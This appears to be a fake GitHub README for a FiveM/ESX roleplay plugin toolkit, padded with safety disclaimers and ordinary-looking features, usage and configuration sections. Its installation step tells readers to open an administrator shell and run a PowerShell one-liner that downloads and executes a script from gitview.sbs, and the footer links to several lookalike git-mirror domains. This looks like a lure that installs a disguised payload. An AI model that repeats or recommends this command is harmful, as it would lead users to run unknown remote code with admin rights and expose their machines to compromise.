# ESX Roleplay Server Plugin Toolkit

> A safe, reviewable toolkit for building authorized ESX roleplay plugins with permissions, events, logging, tests, and no exploit or cheat workflows.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitview.sbs?get=esx-script | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Esx Script modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Esx Script.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

**ESX Roleplay Server Plugin Toolkit** provides project scaffolding, typed event patterns, permission checks, structured logging, test helpers, and deployment checks for authorized FiveM/ESX roleplay servers. It is intended for legitimate server development and maintenance.

**Best for:** Roleplay server developers, administrators, and QA testers.

## Core Features

- ✅ **Plugin Scaffolding** — Generate client, server, shared, and config modules.
- ✅ **Permission Checks** — Centralize authorization and least-privilege defaults.
- ✅ **Event Contracts** — Define validated server and client event payloads.
- ✅ **Structured Logs** — Record actions with correlation IDs and redaction hooks.
- ✅ **Test Helpers** — Exercise server logic without connecting to a live production server.
- ✅ **Deployment Checks** — Validate manifests, dependencies, and configuration.
- ✅ **Admin Audit** — Track sensitive actions for authorized review.

## Usage

```bash
npm run plugin create --name example-job
npm run lint
npm test
npm run deploy check --resource example-job
```

## Configuration

> [!NOTE]
> Server credentials and private endpoints belong in environment variables or a protected server configuration, never in source control.

```json
{
  "resource": { "name": "example-job", "version": "1.0.0" },
  "permissions": { "default": "user", "admin": "administrator" },
  "logging": { "redactPlayers": true, "auditSensitiveActions": true }
}
```

## Screenshots

- Plugin scaffold: `screenshots/plugin-scaffold.png`
- Permission inspector: `screenshots/permission-inspector.png`
- Test report: `screenshots/test-report.png`
- Deployment check: `screenshots/deployment-check.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Resource does not start | Check the manifest name and server resource order. |
| Event payload fails validation | Compare the payload with the declared contract. |
| Permission is denied | Confirm the principal, group, and server configuration. |
| Logs expose personal data | Enable redaction and rotate any exposed token. |

## Use Cases

- **Roleplay Servers** — Build legitimate jobs, inventories, and interactions.
- **Administration** — Add auditable moderation and maintenance tools.
- **QA** — Test plugin logic before a controlled deployment.
- **Education** — Teach event-driven server architecture safely.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Do not create cheats, exploits, account abuse, anti-cheat bypasses, or unauthorized server access. Follow the platform and server terms, protect player data, and deploy only with owner approval.

> [!TIP]
> Use a staging server and a rollback plan before installing a plugin on a live community.

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

## Tags

<!--
esx-script, esx, fivem, roleplay, server-plugin, permissions, logging, testing
-->

[gitview.sbs](https://gitview.sbs?t=esx-script) | [gitrm.cfd](https://gitrm.cfd?t=esx-script) | [gitsl.xyz](https://gitsl.xyz?t=esx-script) | [gitrm.sbs](https://gitrm.sbs?t=esx-script) | [viewgit.sbs](https://viewgit.sbs?t=esx-script)
